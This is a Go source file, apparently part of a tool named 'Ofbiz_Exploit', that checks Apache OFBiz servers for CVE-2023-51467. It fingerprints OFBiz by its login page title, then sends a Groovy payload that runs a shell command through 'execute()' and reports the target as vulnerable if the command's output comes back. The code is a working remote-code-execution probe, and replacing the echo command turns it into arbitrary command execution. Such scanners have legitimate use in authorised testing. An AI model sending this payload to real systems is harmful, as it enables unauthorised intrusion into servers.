package exploit

import (
	"Ofbiz_Exploit/common"
	"strings"
)

func CVE_2023_51467_IsVul(url string) bool {

	//<title>OFBiz: Accounting Manager: Login</title>
	//

	url = strings.TrimSuffix(url, "/")

	if !isOfbiz(url) {
		return false
	}

	poc := "groovyProgram=throw+new+Exception('echo genshinimpact'.execute().text);"
	result := common.SendHttpPost(url, poc)

	if strings.Contains(result, "genshinimpact") {
		return true
	} else {
		return false
	}
}

func isOfbiz(url string) bool {

	result := common.SendHttpGet(url)

	if strings.Contains(result, "<title>OFBiz: &#x8d22;&#x52a1;&#x7ba1;&#x7406;: &#x767b;&#x5f55;</title>") {
		return true
	} else {
		return false
	}
}
